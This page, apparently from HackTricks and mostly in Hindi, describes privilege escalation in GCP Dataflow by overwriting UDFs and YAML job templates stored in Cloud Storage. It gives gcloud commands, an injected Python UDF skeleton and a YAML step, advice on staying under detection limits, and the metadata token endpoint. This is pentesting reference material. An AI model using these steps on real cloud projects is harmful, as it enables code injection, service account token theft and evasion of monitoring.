# GCP - Dataflow Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### `storage.objects.create`, `storage.objects.get`, `storage.objects.update`

Dataflow GCS में स्टोर किए गए UDFs और job template YAMLs की integrity को validate नहीं करता।
यदि आपके पास bucket write access है, तो आप इन फाइलों को overwrite करके कोड inject कर सकते हैं, workers पर कोड execute कर सकते हैं, service account tokens चुरा सकते हैं, या data processing बदल सकते हैं।
यह अटैक दोनों batch और streaming pipeline jobs के लिए लागू है। किसी pipeline पर इस अटैक को execute करने के लिए हमें job के चलने से पहले, पहले कुछ मिनटों में (जब तक job workers create नहीं होते) या job रन के दौरान पहले नए workers autoscaling के कारण spin up होने से पहले UDFs/templates को replace करना होगा।

**Attack vectors:**
- **UDF hijacking:** Python (`.py`) और JS (`.js`) UDFs जो pipelines द्वारा reference किए जाते हैं और customer-managed buckets में stored होते हैं
- **Job template hijacking:** Custom YAML pipeline definitions जो customer-managed buckets में stored हों


> [!WARNING]
> **Run-once-per-worker trick:** Dataflow UDFs और template callables **per row/line** invoke होते हैं। बिना समन्वय के, exfiltration या token theft हजारों बार चलेंगे, जिससे noise, rate limiting, और detection होगा। एक **file-based coordination** pattern का उपयोग करें: शुरुआत में जांचें कि क्या एक marker file (उदा. `/tmp/pwnd.txt`) मौजूद है; अगर मौजूद हो तो malicious code को skip करें; अगर नहीं है तो payload चलाएँ और वह file बनाएं। इससे payload **once per worker** चलेगा, per line नहीं।


#### Direct exploitation via gcloud CLI

1. Enumerate Dataflow jobs and locate the template/UDF GCS paths:

<details>

<summary>Jobs की सूची बनाकर और describe करके template path, staging location, और UDF references प्राप्त करें</summary>
```bash
# List jobs (optionally filter by region)
gcloud dataflow jobs list --region=<region>
gcloud dataflow jobs list --project=<PROJECT_ID>

# Describe a job to get template GCS path, staging location, and any UDF/template references
gcloud dataflow jobs describe <JOB_ID> --region=<region> --full --format="yaml"
# Look for: currentState, createTime, jobMetadata, type (JOB_TYPE_STREAMING or JOB_TYPE_BATCH)
# Pipeline options often include: tempLocation, stagingLocation, templateLocation, or flexTemplateGcsPath
```
</details>

2. GCS से मूल UDF या job template डाउनलोड करें:

<details>

<summary>bucket से UDF फ़ाइल या YAML template डाउनलोड करें</summary>
```bash
# If job references a UDF at gs://bucket/path/to/udf.py
gcloud storage cp gs://<BUCKET>/<PATH>/<udf_file>.py ./udf_original.py

# Or for a YAML job template
gcloud storage cp gs://<BUCKET>/<PATH>/<template>.yaml ./template_original.yaml
```
</details>

3. फ़ाइल को स्थानीय रूप से संपादित करें: दुष्ट पेलोड इंजेक्ट करें (नीचे दिए गए Python UDF या YAML स्निपेट्स देखें) और सुनिश्चित करें कि run-once coordination pattern का उपयोग किया गया है।

4. मूल फ़ाइल को ओवरराइट करने के लिए फिर से अपलोड करें:

<details>

<summary>UDF या template को bucket में ओवरराइट करें</summary>
```bash
gcloud storage cp ./udf_injected.py gs://<BUCKET>/<PATH>/<udf_file>.py

# Or for YAML
gcloud storage cp ./template_injected.yaml gs://<BUCKET>/<PATH>/<template>.yaml
```
</details>

5. अगले job run का इंतजार करें, या (streaming के लिए) autoscaling ट्रिगर करें (उदा. pipeline इनपुट को flood करें) ताकि नए workers spin up हों और modified file को pull करें।

#### Python UDF injection

यदि आप चाहते हैं कि worker आपके C2 server पर डेटा exfiltrate करे तो `urllib.request` का उपयोग करें और `requests` का नहीं।

`requests` classic Dataflow workers पर preinstalled नहीं होता।

<details>

<summary>Malicious UDF with run-once coordination and metadata extraction</summary>
```python
import os
import json
import urllib.request
from datetime import datetime

def _malicious_func():
# File-based coordination: run once per worker.
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return

# malicous code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")

def transform(line):
# Malicous code entry point - runs per line but coordination ensures once per worker
try:
_malicious_func()
except Exception:
pass
# ... original UDF logic follows ...
```
</details>


#### Job template YAML injection

एक callable के साथ `MapToFields` स्टेप इंजेक्ट करें जो एक coordination file का उपयोग करता है। YAML-आधारित pipelines के लिए जो `requests` को सपोर्ट करते हैं, इसका उपयोग करें यदि template में `dependencies: [requests]` घोषित है; अन्यथा `urllib.request` को प्राथमिकता दें।

क्लीनअप स्टेप (`drop: [malicious_step]`) जोड़ें ताकि pipeline अभी भी destination पर वैध डेटा लिखे।

<details>

<summary>दुर्भावनापूर्ण `MapToFields` स्टेप और पाइपलाइन YAML में क्लीनअप</summary>
```yaml
- name: MaliciousTransform
type: MapToFields
input: Transform
config:
language: python
fields:
malicious_step:
callable: |
def extract_and_return(row):
import os
import json
from datetime import datetime
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return True
try:
import urllib.request
# malicious code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")
except Exception:
pass
return True
append: true
- name: CleanupTransform
type: MapToFields
input: MaliciousTransform
config:
fields: {}
append: true
drop:
- malicious_step
```
</details>

### Compute Engine से Dataflow Workers तक पहुँच

**अनुमतियाँ:** `compute.instances.osLogin` or `compute.instances.osAdminLogin` (with `iam.serviceAccounts.actAs` over the worker SA), or `compute.instances.setMetadata` / `compute.projects.setCommonInstanceMetadata` (with `iam.serviceAccounts.actAs`) for legacy SSH key injection

Dataflow workers Compute Engine VMs के रूप में चलते हैं। OS Login या SSH के माध्यम से workers तक पहुँच आपको metadata endpoint (`http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`) से SA tokens पढ़ने, डेटा में छेड़छाड़ करने, या मनमाना कोड चलाने की अनुमति देती है।

For exploitation details, see:
- [GCP - Compute Privesc](gcp-compute-privesc/README.md) — `compute.instances.osLogin`, `compute.instances.osAdminLogin`, `compute.instances.setMetadata`

## References

- [Dataflow Rider: How Attackers can Abuse Shadow Resources in Google Cloud Dataflow](https://www.varonis.com/blog/dataflow-rider)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [gcloud dataflow jobs describe](https://cloud.google.com/sdk/gcloud/reference/dataflow/jobs/describe)
- [Apache Beam YAML: User-defined functions](https://beam.apache.org/documentation/sdks/yaml-udf/)
- [Apache Beam YAML Transform Reference](https://beam.apache.org/releases/yamldoc/current/)

{{#include ../../../banners/hacktricks-training.md}}
